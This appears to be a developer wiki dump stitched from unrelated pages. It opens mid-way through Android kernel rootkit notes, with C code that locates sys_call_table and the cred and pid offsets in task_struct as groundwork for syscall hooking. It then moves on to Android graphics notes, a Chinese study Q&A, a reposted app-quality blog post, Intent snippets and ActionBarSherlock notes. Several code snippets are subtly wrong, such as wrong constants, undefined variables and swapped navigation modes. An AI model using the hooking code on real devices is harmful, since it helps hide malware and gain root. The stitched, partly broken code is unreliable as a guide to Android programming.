		if(((*(unsigned long *)vector_swi_addr) & 0xffff0000) == 0xe3570000){
			i=0x10-(((*(unsigned long *)vector_swi_addr) & 0xff00) >> 8);
			size=((*(unsigned long *)vector_swi_addr) & 0xff ) << (2*i);
			break;
		}
	}
```
```
   118: e92d0030 stmdb   sp!, {r4, r5}   ; push fifth and sixth args
   11c: e31c0c01 tst     ip, #256        ; are we tracing syscalls?
   120: 1a000008 bne     148 <__sys_trace>
[*]124: e3570f5b cmp     r7, #364        ; check upper syscall limit
   128: e24fee13 sub     lr, pc, #304    ; return address
   12c: 3798f107 ldrcc   pc, [r8, r7, lsl #2] ; call sys_* routine
```
The asterisk part compares the size of sys_call_table. This code checks if
the r7 register value which contains system call number is bigger than
syscall limit. So, if we search opcode pattern(0xe357????) corresponding to
"cmp r7", we can get the exact size of sys_call_table. For your
information, all of the offset values can be obtained by using ARM
architecture operand counting method.
# Getting over the problem of structure size in kernel versions
Even if you are using the same version of kernels, the size of structure
varies according to the compile environments and config options. Thus, if
we use a wrong structure with a wrong size, it is not likely to work as we
expect. To prevent errors caused by the difference of structure offset and
to enable our code to work in various kernel environments, we need to build
a function which gets the offset needed from the structure.
```cpp
void find_offset(void){
	unsigned char *init_task_ptr=(char *)&init_task;
	int offset=0,i;
	char *ptr=0;
	/* getting the position of comm offset
	   within task_struct structure */
	for(i=0;i<0x600;i++){
		if(init_task_ptr[i]=='s'&&init_task_ptr[i+1]=='w'&&
		init_task_ptr[i+2]=='a'&&init_task_ptr[i+3]=='p'&&
		init_task_ptr[i+4]=='p'&&init_task_ptr[i+5]=='e'&&
		init_task_ptr[i+6]=='r'){
			comm_offset=i;
			break;
		}
	}
	/* getting the position of tasks.next offset
	   within task_struct structure */
	init_task_ptr+=0x50;
	for(i=0x50;i<0x300;i+=4,init_task_ptr+=4){
		offset=*(long *)init_task_ptr;
		if(offset&&offset>0xc0000000){
			offset-=i;
			offset+=comm_offset;
			if(strcmp((char *)offset,"init")){
				continue;
			} else {
				next_offset=i;
				/* getting the position of parent offset
				   within task_struct structure */
				for(;i<0x300;i+=4,init_task_ptr+=4){
					offset=*(long *)init_task_ptr;
					if(offset&&offset>0xc0000000){
						offset+=comm_offset;
						if(strcmp
						((char *)offset,"swapper"))
						{
							continue;
						} else {
							parent_offset=i+4;
							break;
						}
					}
				}
				break;
			}
		}
	}
	/* getting the position of cred offset
	   within task_struct structure */
	init_task_ptr=(char *)&init_task;
	init_task_ptr+=comm_offset;
	for(i=0;i<0x50;i+=4,init_task_ptr-=4){
		offset=*(long *)init_task_ptr;
		if(offset&&offset>0xc0000000&&offset<0xd0000000&&
			offset==*(long *)(init_task_ptr-4)){
			ptr=(char *)offset;
			if(*(long *)&ptr[4]==0&&
				*(long *)&ptr[8]==0&&
				*(long *)&ptr[12]==0&&
				*(long *)&ptr[16]==0&&
				*(long *)&ptr[20]==0&&
				*(long *)&ptr[24]==0&&
				*(long *)&ptr[28]==0&&
				*(long *)&ptr[32]==0){
				cred_offset=i;
				break;
			}
		}
	}
	/* getting the position of pid offset
	   within task_struct structure */
	pid_offset=parent_offset-0xc;
	return;
}
```
# Treating version magic
# sys_call_table hooking through /dev/kmem access technique
# modifying sys_call_table handle code in vector_swi handler routine
# exception vector table modifying hooking techniques
# exception vector table
# Hooking techniques changing vector_swi handler
# Hooking techniques changing branch instruction offset
# 参考
 * http://www.phrack.org/issues.html?issue=68&id=6#article
# Android Graphics
# 2D Graphics Basic
 * Canvas
 * Paint
   * Paint
   * TextPaint
pseudocode of drawing:
```
canvas.draw(shape, paint).
canvas.draw(text, text_paint).
```
# Canvas
if you feel diffcult to calculate the extract point set for drawing, please try another way: don't move your paint, move your canvas.
 * traslate
 * rotate
```java
// Preconcat the current matrix with the specified translation
void translate(float dx, float dy)
// Preconcat the current matrix with the specified rotation.
public final void rotate (float degrees, float px, float py)
public void rotate (float degrees)
```
[[Image(http://www.winward.co.uk/RADIO%20MANAGER%20CASE.jpg, 50%)]]
save/restore:
```java
canvas.save();
canvas.rocate(...);
// draw, draw, draw ...
canvas.restore();
```
# Paint
 * Style
  * Paint.Style.STROKE
  * Paint.Style.FILL
  * Paint.Style.FILL_AND_STROKE
 * Color
  * 0x00FFEE00
 * Alpha
 
# Coordinate
```
 +---------> x
 |
 |
 |
 |
 v y
```
```
         | -90
         |
         |
 -180    |
---------+--------- 0
 +180    |
         |
         |
         | +90
```
# Basic Drawing Element
 * Rect / RectF
 * Point
 * Line
 * Arc
 * Circle
 * Oval
 * Path
 * Text
 * Bitmap
 * Picture
# Rect
 * left,top
 * right,bottom
```java
void	 drawRect(RectF rect, Paint paint)
void	 drawRect(float left, float top, float right, float bottom, Paint paint)
void	 drawRect(Rect r, Paint paint)
void	 drawRoundRect(RectF rect, float rx, float ry, Paint paint)
```
# Point
 * x,y
 * set of many (x,y) pairs.
```
void	 drawPoint(float x, float y, Paint paint)
void	 drawPoints(float[] pts, int offset, int count, Paint paint)
void	 drawPoints(float[] pts, Paint paint)
```
# Line (Straight Line)
 * straight line
  * start point 
  * end point
 * manay straight line
  * set of (pointA, pointZ) pairs
 * bezier (See Path)
```
void	 drawLine(float startX, float startY, float stopX, float stopY, Paint paint)
void	 drawLines(float[] pts, Paint paint)
void	 drawLines(float[] pts, int offset, int count, Paint paint)
```
# Arc
 * start angle
 * sweep angle
 * use rect center or not
```java
void	 drawArc(RectF oval, float startAngle, float sweepAngle, boolean useCenter, Paint paint)
```
[[Image(http://www.csser.name/attachments/2008/08/1_200808271053141Jdou.jpg)]]
# Circle
 * centre of a circle
 * radius
```
void	 drawCircle(float cx, float cy, float radius, Paint paint)
```
# Oval
...
# Path
 * all contour of basic drawing element(circle, arc, oval, etc)
 * bezier curve
 * draw text on path
# Draw them together
# Implement Custom Widget
```
#!java
import android.content.Context;
import android.graphics.Canvas;
import android.util.AttributeSet;
import android.view.View;
public class YourView extends View {
	public YourView(Context context) {
		super(context);
	}
	
        // if you want configure the widget with android view xml, you must add this constructor
	public YourView(Context context, AttributeSet attrs) {
		super(context, attrs);
	}
	@Override
	protected void onDraw(Canvas canvas) {
		// draw your widget here
	}
}
```
[[TOC]]
```div class=note
 
''吴希龙:''
>Android部分控件，UI处理时性能不够高。
 * [http://developer.android.com/tools/debugging/debugging-ui.html#layoutopt Optimizing Your UI]
>对java的内存机制不够熟悉。
 
>某些简单的应用场景需要很复杂的逻辑实现，代码可扩展性很差。
 * 试着化简已有的代码
 * 搞清哪里会发生变化, 有没有方法可以它有规则的变化
 * 解决单一问题
 * 不必追求100分
''严国娇:''
>Q1：对于android应用开发的学习是从模仿已有的代码开始，没有系统化的学习经验；
 * 模仿源码就是很好的学习方法啦, 看完一本入门的书, 多动手写代码.
>Q2：个人的学习局限于项目相关的内容，总是用到什么才临时学习如何使用该方法，导致学习没有方向性；
 * 保持好奇心,有足够的八卦劲头, 方向是相对的,不重要.
>Q3：代码编写逻辑性差，不断地改动代码使得代码可读性变差；
 * 学会起个好名字
 * 保持规律
 * 翻翻[http://book.douban.com/subject/1951158/ <<代码大全>>])
>Q4：对成为android开发工程师需要如何准备，以及他的发展前景不明确。（补充问题）
 * 产品经理, 运营, 开发/研发
 * 传统手机/互联网/智能设备(电视/冰箱/洗衣机/马桶/...)
 * 游戏
 
''马浩然:''
>我的问题跟严国娇的问题相似，今年才开始接触android开发，自身对java积累也不多，对android本身的运行机制也不清楚，学习缺乏目的性。
>对于项目部分，更多的处于阅读文档及模仿代码阶段
>应用程序运行流程不够清晰。
>软件开发过程中团队合作比较困难。
 
```
# 基础部分
 * Java
  * 掌握常用的数据结构,了解他们适合干啥
 * UI
   * 基本UI控件的使用
   * 自定义控件的设计
   * Android 2D
   * 动画
   * 传感器
   * OpenGL
 * 存储
  * Shared Preference
  * Sqlite
  * DAO
 * 网络
  * Socket编程
  * 协议
    * HTTP
    * XML/JSON
 * 并发编程
   * 基于锁的并发编程
   * 生产者和消费者(Android: Message, Handler, Looper)
 * 性能分析
   * traceview
   * 内存分析: MAT工具
 * 逆向工程
   * !ApkTools
 * 多媒体
   * 音乐/视频播放
   * 录音/录像/拍照/图形图像处理
 * 定位和地图 
 
# Java
# 
# 源代码
 * Android API Demos ($ANDROID_SDK/sample/)
 * Github
# 好书
# 国外
 * [http://book.douban.com/subject/4712417/ Building Android Apps with HTML, CSS, and JavaScript]
 * [http://book.douban.com/subject/6971223/ Android 3.0 Animations]
 * [http://book.douban.com/subject/19976838/ Android应用性能优化]
 * [http://book.douban.com/subject/4730837/ Event Processing in Action]
# 国内
 * [http://book.douban.com/subject/20556210/ Android软件安全与逆向分析]
 * [http://book.douban.com/subject/6811238/ Android内核剖析]
# 线上资源
 * [http://developer.android.com/training/index.html Google android training]
 * [http://developer.android.com/guide/components/index.html Google Android API Guide]
# Heimdall
 * http://www.glassechidna.com.au/products/heimdall/
Heimdall is a cross-platform open-source tool suite used to flash firmware (aka ROMs) onto Samsung Galaxy S devices.
# HelloAndroid =
[This post is by  Roman Nurik, who is passionate about icons. —Tim Bray]
With thousands of new apps being published in Android Market every week, it’s becoming more and more important to proactively work at breaking through the clutter (hooray for marketing jargon!). One way of improving your app’s visibility in the ecosystem is by deploying well-targeted mobile advertising campaigns and cross-app promotions. However, there’s another time-tested method of fueling the impression-install-ranking cycle: improve the product!
A better app can go a very long way: a higher quality app will translate to higher user ratings, generally better rankings, more downloads, and higher retention (longer install periods). High-quality apps also have a much higher likelihood of getting some unanticipated positive publicity such as being featured in Android Market or social media buzz.
The upside to having a higher-quality app is obvious. However, it’s not always clear how to write a so called ‘better app.’ The path to improving app quality isn’t always well-lit. The term ‘quality’, and its close cousins ‘polish’ and ‘fit and finish’ aren’t always well-defined. In this post, we’ll begin to light the path by looking at a couple of key factors in app quality, and furthermore, look at ways of improving your app along these dimensions.
Listen to your users
Given that pretty much any measure of the ‘success’ of an app involves user-related metrics such as number of downloads, daily actives, retention rates, etc., it’s a good idea to start thinking of your app’s quality as it relates back to your users.
The most obvious way to listen to users is by reading and addressing comments on your app in Android Market. Although the comments aren’t always productive or constructive, some will provide valuable insight on aspects of your app that you may not have consciously considered before. It’s important to remember that users have the opportunity to change their ratings and comments about an app as much as they’d like.
Now, since Android Market doesn’t currently provide a bidirectional communication medium for developers and their users, you should set up your own support and discussion destination(s). There are some great support tools out there that can put you in touch with your users directly such as Google Groups, Zoho Discussions, getsatisfaction.com and uservoice.com. Once you get set up with such a tool, make sure to fill in the support link in your Android Market listing -- users do click through to these.
Another way to better listen to your users is by having a public beta or trusted tester program. It’s crucial to have some amount of real user testing before releasing something in Android Market. Fortunately, you can distribute your apps to users outside of Market via a website; this website can require a login or be publicly accessible — it’s entirely up to you. Take advantage of this opportunity by offering your next planned update to some early adopters, before submitting to Market. You’ll be surprised by how many little, yet impactful, improvements can come out of crowd-sourced, real-user testing.
Improve stability and eliminate bugs
I won’t go into detail about why this is important, because hopefully it’s obvious. And hopefully you’ve been reading this blog and following the best practices outlined in previous posts, so you have a solid idea on how to improve in this arena.
One noteworthy and yet relatively underused tool for catching stability issues like crashes, is the UI/Application Exerciser Monkey (aka Monkey). Monkey will send random UI events to your app’s activitie, allowing you to trigger user flows that can uncover stability problems.
Also, with the new error reporting features in Android 2.2, users now have the ability to report application crashes to developers. These show up in aggregate in the Android Market developer console. Make sure to read these reports and act on them appropriately.
Lastly, keep an external bug and feature request tracker. This will enable your users to engage with the app at a closer level, by following features and bugs that affect them. User frustration with app problems can be effectively managed with diligent issue tracking and communication. Some of the community support tools listed above offer issue tracking features, and if your project is open source, most popular repository hosting sites such as Google Code and GitHub will offer this as well.
Improve UI Responsiveness
One sure-fire way to tick off your users is to have a slow UI. Research has shown that speed matters... for any interface, be it desktop, web, or mobile. In fact, the importance of speed is amplified on mobile devices since users often need their information on the go and in a hurry.
As Brad Fitzpatrick mentioned in his Google I/O 2010 talk,  Writing Zippy Android Apps, you can improve your apps’s UI responsiveness by moving long-running operations off the application’s main thread. See the talk for detailed recommendations and debugging tips.
One way to improve UI performance is to minimize the complexity of your layouts. If you open up hierarchyviewer and see that your layouts are more than 5 levels deep, it may be time to simplify your layout. Consider refactoring those deeply nested LinearLayouts into RelativeLayout. As Romain Guy pointed out in his  World of ListView talk at Google I/O, View objects cost around 1 to 2 KB of memory, so large view hierarchies can be a recipe for disaster, causing frequent VM garbage collection passes which block the main (UI) thread.
Lastly, as Tim pointed out in Traceview War Story, tools like traceview and ddms can be your best frends for improving performance by profiling method calls and monitoring VM memory allocations, respectively.
More resources:
Designing for Performance
Designing for Responsiveness
Improve usability
I’ll say it again here, listen to your users! Ask a handful of real Android device users (friends, family, etc.) to try out your application and observe them as they interact with it. Look for cases where they get confused, are unsure how to proceed, or are surprised by certain behaviors. Minimize these cases by rethinking some of the interactions in your app, perhaps working in some of the  user interface patterns the Android UI team discussed at Google I/O.
In the same vein, two problems that currently plague Android user interfaces are small tap targets and overly small font sizes. These are generally easy to fix and can make a big impact. As a general rule, optimize for ease of use and legibility, while minimizing, or at least carefully balancing, information density.
Another way to incrementally improve usability, based on real-world data, is to implement Analytics throughout your app to log usage of particular sections. Consider demoting infrequently used sections to the options menu, or removing them altogether. For oftenly-used sections and UI elements, make sure they’re immediately obvious and easily accessible in your app’s UI so that users can get to them quickly.
Lastly, usability is an extensive and well-documented subject, with close ties to interface design, cognitive science, and other disciplines. If you’re looking for a crash-course, start with  Donald Norman’s The Design of Everyday Things.
Improve appearance and aesthetics
There’s no substitute for a real user interface designer — ideally one who’s well-versed in mobile and Android, and ideally handy with both interaction and visual design. One popular venue to post openings for designers is jobs.smashingmagazine.com, and leveraging social connections on Twitter and LinkedIn can surface great talent.
If you don’t have the luxury of working with a UI designer, there are some ways in which you can improve your app’s appearance yourself. First, get familiar with Adobe Photoshop, Adobe Fireworks, or some other raster image editing tool. Mastering the art of the pixel in these apps takes time, but honing this skill can help build polish across your interface designs. Also, master the resources framework by studying the framework UI assets and layouts and reading through the new resources documentation. Techniques such as 9-patches and resource directory qualifiers are somewhat unique to Android, and are crucial in building flexible yet aesthetic UIs.
The recently-published Android UI Design Tips slide deck contains a few more best practices for your consideration.
Deliver the right set of features
Having the right set of features in your app is important. It’s often easy to fall into the trap of feature-creep, building as much functionality into your app as possible. Providing instant gratification by immediately showing the most important or relevant information is crucial on mobile devices. Providing too much information can be as frustrating (or even more so) than not providing enough of it.
And again, listen to your users by collecting and responding to feature requests. Be careful, though, to take feature requests with grains of salt. Requests can be very useful in aggregate, to get a sense of what kinds of functionality you should be working on, but not every feature request needs to be implemented.
Integrate with the system and third-party apps
A great way to deliver a delight user experience is to integrate tightly with the operating system. Features like app widgets, live folders, global search integration, and Quick Contacts badges are fairly low-hanging fruit in this regard. For some app categories, basic features like app widgets are par for the course. Not including them is a sure-fire way to tarnish an otherwise positive user experience. Some apps can achieve even tighter OS integration with the new contacts, accounts and sync APIs available in Android 2.0 and later. A few sample apps that show how to use these APIs are SampleSyncAdapter (bundled with the SDK samples) and JumpNote.
Third-party integrations can provide even more user delight and give the user a feeling of device cohesiveness. It’s also a really nice way of adding functionality to your app without writing any extra code (by leveraging other apps’ functionalities). For example, if you’re creating a camera app, you can allow users to edit their photos in Photoshop Express before saving them to their collection, if they have that third-party application installed. More information on this subject is available in the Can I Use this Intent? article.
More resources:
Designing for seamlessness
Pay attention to details...
One particular detail I’ll call out is in icon quality and consistency. Make sure your app icons (especially your launcher icon) are crisp and pixel-perfect at all resolutions, and follow the icon guidelines, at least in spirit if not in letter. If you’re having trouble or don’t have the resources to design the icons yourself, consider using the new Android Asset Studio tool (a project I’ve recently open-sourced) to generate a set.
...and more...
Along with this blog, make sure to follow  @AndroidDev on Twitter — we’re constantly collecting and sharing tips and tricks on Android application development that you won’t always find anywhere else. And of course, don’t be afraid to ask questions in our support forums on Stack Overflow and Google Groups.
Thanks for reading!
 * http://www.herkulano.com/2010/10/improving-app-quality/
# AndroidIntentUsage =
```
#!java
Uri uri = Uri.parse("http://www.google.com");
Intent it  = new Intent(Intent.ACTION_VIEW,uri);
startActivity(it);
//show maps:
Uri uri = Uri.parse("geo:38.899533,-77.036476");
Intent it = new Intent(Intent.Action_VIEW,uri);
startActivity(it); 
//show ways
Uri uri = Uri.parse("http://maps.google.com/maps?f=d&saddr=startLat%20startLng&daddr=endLat%20endLng&hl=en");
Intent it = new Intent(Intent.ACTION_VIEW,URI);
startActivity(it);
//call dial program
Uri uri = Uri.parse("tel:xxxxxx");
Intent it = new Intent(Intent.ACTION_DIAL, uri);  
startActivity(it);  
Uri uri = Uri.parse("tel.xxxxxx");
Intent it =new Intent(Intent.ACTION_CALL,uri);
//don't forget add this config:<uses-permission id="android.permission.CALL_PHONE" />
//send sms/mms
//call sender program
Intent it = new Intent(Intent.ACTION_VIEW);   
it.putExtra("sms_body", "The SMS text");   
it.setType("vnd.android-dir/mms-sms");   
startActivity(it);  
//send sms
Uri uri = Uri.parse("smsto:0800000123");   
Intent it = new Intent(Intent.ACTION_SENDTO, uri);   
it.putExtra("sms_body", "The SMS text");   
startActivity(it);  
//send mms
Uri uri = Uri.parse("content://media/external/images/media/23");   
Intent it = new Intent(Intent.ACTION_SEND);   
it.putExtra("sms_body", "some text");   
it.putExtra(Intent.EXTRA_STREAM, uri);   
it.setType("image/png");   
startActivity(it); 
//send email
 
Uri uri = Uri.parse("mailto:xxx@abc.com");
Intent it = new Intent(Intent.ACTION_SENDTO, uri);
startActivity(it);
Intent it = new Intent(Intent.ACTION_SEND);   
it.putExtra(Intent.EXTRA_EMAIL, "me@abc.com");   
it.putExtra(Intent.EXTRA_TEXT, "The email body text");   
it.setType("text/plain");   
startActivity(Intent.createChooser(it, "Choose Email Client"));  
Intent it=new Intent(Intent.ACTION_SEND);     
String[] tos={"me@abc.com"};     
String[] ccs={"you@abc.com"};     
it.putExtra(Intent.EXTRA_EMAIL, tos);     
it.putExtra(Intent.EXTRA_CC, ccs);     
it.putExtra(Intent.EXTRA_TEXT, "The email body text");     
it.putExtra(Intent.EXTRA_SUBJECT, "The email subject text");     
it.setType("message/rfc822");     
startActivity(Intent.createChooser(it, "Choose Email Client"));   
//add extra
Intent it = new Intent(Intent.ACTION_SEND);   
it.putExtra(Intent.EXTRA_SUBJECT, "The email subject text");   
it.putExtra(Intent.EXTRA_STREAM, "file:///sdcard/mysong.mp3");   
sendIntent.setType("audio/mp3");   
startActivity(Intent.createChooser(it, "Choose Email Client"));
//play media
Intent it = new Intent(Intent.ACTION_VIEW);
Uri uri = Uri.parse("file:///sdcard/song.mp3");
it.setDataAndType(uri, "audio/mp3");
startActivity(it);
Uri uri = Uri.withAppendedPath(MediaStore.Audio.Media.INTERNAL_CONTENT_URI, "1");   
Intent it = new Intent(Intent.ACTION_VIEW, uri);   
startActivity(it);  
//Uninstall
Uri uri = Uri.fromParts("package", strPackageName, null);   
Intent it = new Intent(Intent.ACTION_DELETE, uri);   
startActivity(it);
//uninstall apk
Uri uninstallUri = Uri.fromParts("package", "xxx", null);
returnIt = new Intent(Intent.ACTION_DELETE, uninstallUri);
//install apk
Uri installUri = Uri.fromParts("package", "xxx", null);
returnIt = new Intent(Intent.ACTION_PACKAGE_ADDED, installUri);
//play audio
Uri playUri = Uri.parse("file:///sdcard/download/everything.mp3");
returnIt = new Intent(Intent.ACTION_VIEW, playUri);
//send extra
Intent it = new Intent(Intent.ACTION_SEND);  
it.putExtra(Intent.EXTRA_SUBJECT, "The email subject text");  
it.putExtra(Intent.EXTRA_STREAM, "file:///sdcard/eoe.mp3");  
sendIntent.setType("audio/mp3");  
startActivity(Intent.createChooser(it, "Choose Email Client"));
//search
Uri uri = Uri.parse("market://search?q=pname:pkg_name");  
Intent it = new Intent(Intent.ACTION_VIEW, uri);  
startActivity(it);  
//where pkg_name is the full package path for an application  
//show program detail page
Uri uri = Uri.parse("market://details?id=app_id");  
Intent it = new Intent(Intent.ACTION_VIEW, uri);  
startActivity(it);  
//where app_id is the application ID, find the ID  
//by clicking on your application on Market home  
//page, and notice the ID from the address bar
//search google
Intent intent = new Intent();
intent.setAction(Intent.ACTION_WEB_SEARCH);
intent.putExtra(SearchManager.QUERY,"searchString")
startActivity(intent);
```
[[TOC]]
# ActionBarSherlock
 * [http://actionbarsherlock.com/ HOME]
# 使用方法
# 功能
# 是否显示ActionBar
方法1:
```java
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.action_modes);
        ...
    }
```
方法2:
```sh
<activity
    android:label="@string/app_name"
    android:name=".Main" 
    android:theme="@android:style/Theme.Holo.NoActionBar">
```
方法3:
```java
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    ActionBar bar = getActionBar();
    bar.hide();
}
```
# 回调函数
```java
		@Override
		public boolean onPrepareActionMode(ActionMode mode, Menu menu) {
			return false;
		}
		@Override
		public boolean onActionItemClicked(ActionMode mode, MenuItem item) {
			Toast.makeText(ActionModesNoActionBar.this, "Got click: " + item, Toast.LENGTH_SHORT).show();
			mode.finish();
			return true;
		}
		@Override
		public void onDestroyActionMode(ActionMode mode) {
		}
	}
```
# 是否显示Title区域
```java
    getSupportActionBar().setDisplayShowTitleEnabled(true);
    getSupportActionBar().setTitle(null);
```
# 是否显示Subtitle区域
```java
    getSupportActionBar().setSubtitle(null);
```
# 自定义Title区域
```java
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.text);
		View customNav = LayoutInflater.from(this).inflate(R.layout.custom_view, null);
		// 使用自定义布局
		getSupportActionBar().setCustomView(customNav);
		getSupportActionBar().setDisplayShowCustomEnabled(true);
	}
```
# 是否显示HomeIcon区域
```java
    getSupportActionBar().setDisplayShowHomeEnabled(true);
    getSupportActionBar().setDisplayUseLogoEnabled(true);
    getSupportActionBar().setDisplayHomeAsUpEnabled(false);
```
# 进度条控制
```java
	@Override
	public void onCreate(Bundle savedInstanceState) {
        requestWindowFeature(Window.FEATURE_PROGRESS);
		super.onCreate(savedInstanceState);
    }
```
显示/隐藏:
```java
    setSupportProgressBarVisibility(false);
```
进度控制:
```java
    setSupportProgress(30);
    setSupportSecondaryProgress(60);
```
# 进度轮控制
```java
	@Override
	public void onCreate(Bundle savedInstanceState) {
        requestWindowFeature(Window.FEATURE_INDETERMINATE_PROGRESS);
		super.onCreate(savedInstanceState);
    }
```
显示/隐藏:
```java
        setSupportProgressBarIndeterminateVisibility(false);
```
# 搜索框
```java
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// 
		boolean isLight = SampleList.THEME == R.style.Theme_Sherlock_Light;
		// 创建SerrchView
		SearchView searchView = new SearchView(getSupportActionBar().getThemedContext());
		searchView.setQueryHint("查找联系人，请输入联系人的姓名或者手机号");
        // 处理查询
		searchView.setOnQueryTextListener(new OnQueryTextListener() {
			
			@Override
			public boolean onQueryTextSubmit(String query) {
				return false;
			}
			
			@Override
			public boolean onQueryTextChange(String newText) {
				return false;
			}
		});
        // 退出搜索 
		searchView.setOnCloseListener(new OnCloseListener() {
			
			@Override
			public boolean onClose() {
				return false;
			}
		});
		menu.add("Search")
		        .setIcon(isLight ? R.drawable.ic_search_inverse : R.drawable.abs__ic_search)
		        .setActionView(searchView)
		        .setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM | MenuItem.SHOW_AS_ACTION_COLLAPSE_ACTION_VIEW);
		return true;
	}
```
也可以配置到XML中:
```
<menu
    xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:id="@+id/action_search"
        android:alphabeticShortcut="f"
        android:title="@string/search"
        android:icon="@drawable/ic_menu_search_holo_light"
        android:showAsAction="ifRoom|collapseActionView"
        android:actionViewClass="android.widget.SearchView"                                                                                                            
        android:imeOptions="actionSearch" />
</menu>
```
# 导航模式
# 1. 标准模式(不使用Tab区)
```java
     getSupportActionBar().setNavigationMode(ActionBar.NAVIGATION_MODE_LIST);
```
# 2. 列表导航
```java
     getSupportActionBar().setNavigationMode(ActionBar.NAVIGATION_MODE_STANDARD);
```
```
public class ListNavigation extends SherlockActivity implements ActionBar.OnNavigationListener {
	private TextView mSelected;
	private String[] mLocations;
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_listnavication);
		mSelected = (TextView) findViewById(R.id.text);
		mLocations = getResources().getStringArray(R.array.locations);
        # 设置下拉列表项
		Context context = getSupportActionBar().getThemedContext();
		ArrayAdapter<CharSequence> listAdapter = ArrayAdapter.createFromResource(context, R.array.locations, R.layout.sherlock_spinner_item);
		listAdapter.setDropDownViewResource(R.layout.sherlock_spinner_dropdown_item);
        # 设置列表导航方式
		getSupportActionBar().setNavigationMode(ActionBar.NAVIGATION_MODE_LIST);
        # 设置回调函数
		getSupportActionBar().setListNavigationCallbacks(listAdapter, this);
	}
	@Override
	public boolean onNavigationItemSelected(int itemPosition, long itemId) {
		mSelected.setText("Selected: " + mLocations[itemPosition]);
		return true;
	}
}
```
# 3. Tab导航
```java
     getSupportActionBar().setNavigationMode(ActionBar.NAVIGATION_MODE_TABS);
```
# Tab导航
 1. 可以增/删Tab导航项目
# ActionItem的增加/删除
```java
	public boolean onCreateOptionsMenu(Menu menu) {
		//Used to put dark icons on light action bar
		boolean isLight = SampleList.THEME == R.style.Theme_Sherlock_Light;
		menu.add("Save").setIcon(isLight ? R.drawable.ic_compose_inverse : R.drawable.ic_compose).setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
		menu.add("Search").setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM | MenuItem.SHOW_AS_ACTION_WITH_TEXT);
		menu.add("Refresh").setIcon(isLight ? R.drawable.ic_refresh_inverse : R.drawable.ic_refresh)
		        .setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM | MenuItem.SHOW_AS_ACTION_WITH_TEXT);
		return true;
	}
```
 
# Action模式切换
实现模式:
```
	private final class ExtActionMode implements ActionMode.Callback {
		@Override
		public boolean onCreateActionMode(ActionMode mode, Menu menu) {
            // 不考虑主题切换就不必这样麻烦
			boolean isLight = SampleList.THEME == R.style.Theme_Sherlock_Light;
			menu.add("Save").setIcon(isLight ? R.drawable.ic_compose_inverse : R.drawable.ic_compose)
			        .setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
			menu.add("Search").setIcon(isLight ? R.drawable.ic_search_inverse : R.drawable.ic_search)
			        .setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
			menu.add("Refresh").setIcon(isLight ? R.drawable.ic_refresh_inverse : R.drawable.ic_refresh)
			        .setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
			menu.add("Save").setIcon(isLight ? R.drawable.ic_compose_inverse : R.drawable.ic_compose)
			        .setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
			menu.add("Search").setIcon(isLight ? R.drawable.ic_search_inverse : R.drawable.ic_search)
			        .setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
			menu.add("Refresh").setIcon(isLight ? R.drawable.ic_refresh_inverse : R.drawable.ic_refresh)
			        .setShowAsAction(MenuItem.SHOW_AS_ACTION_IF_ROOM);
			return true;
		}
    }
```
切换模式:
```java
ActionMode mMode = null;
mMode = startActionMode(new ExtActionMode());
```
关闭模式:
```java
mMode.finish();
```
# ActionBar叠加模式(Overlay)
```
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        requestWindowFeature(Window.FEATURE_ACTION_BAR_OVERLAY);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.overlay);
        // 设置ActionBar的背景, 叠加方式一般使用半透明的背景.
        getSupportActionBar().setBackgroundDrawable(getResources().getDrawable(R.drawable.ab_bg_black));
   }
```
# ActionProvider
每个menuItem通常都是由展现方式+处理逻辑组合而成的相对独立的代码块， 可以将其封装到ActionProvider中，便于日后复用。
```xml
<?xml version="1.0" encoding="utf-8"?>
<menu xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:id="@+id/menu_item_action_provider_action_bar"
        android:showAsAction="ifRoom"
        android:title="Settings"
        android:actionProviderClass="com.actionbarsherlock.sample.demos.ActionProviders$SettingsActionProvider"/>
    <item android:id="@+id/menu_item_action_provider_overflow"
        android:showAsAction="never"
        android:title="Settings"
        android:actionProviderClass="com.actionbarsherlock.sample.demos.ActionProviders$SettingsActionProvider"/>
</menu>
```
ActionProviders$SettingsActionProvider:
```java
	public static class SettingsActionProvider extends ActionProvider {
		/** An intent for launching the system settings. */
		private static final Intent sSettingsIntent = new Intent(Settings.ACTION_SETTINGS);
		/** Context for accessing resources. */
		private final Context mContext;
		/**
		 * Creates a new instance.
		 * 
		 * @param context Context for accessing resources.
		 */
		public SettingsActionProvider(Context context) {
			super(context);
			mContext = context;
		}
		/**
		 * {@inheritDoc}
		 */
		@Override
		public View onCreateActionView() {
			// Inflate the action view to be shown on the action bar.
			LayoutInflater layoutInflater = LayoutInflater.from(mContext);
			View view = layoutInflater.inflate(R.layout.settings_action_provider, null);
			ImageButton button = (ImageButton) view.findViewById(R.id.button);
			// Attach a click listener for launching the system settings.
			button.setOnClickListener(new View.OnClickListener() {
				@Override
				public void onClick(View v) {
					mContext.startActivity(sSettingsIntent);
				}
			});
			return view;
		}
		/**
		 * {@inheritDoc}
		 */
		@Override
		public boolean onPerformDefaultAction() {
			// This is called if the host menu item placed in the overflow menu of the
			// action bar is clicked and the host activity did not handle the click.
			mContext.startActivity(sSettingsIntent);
			return true;
		}
	}
```
# Fragement相关
# 对话框
# DialogFragment
# 生命周期
DialogFragment属于Fragment, 所以他的生命周期与一般的Fragment无差别。
```
# 注意
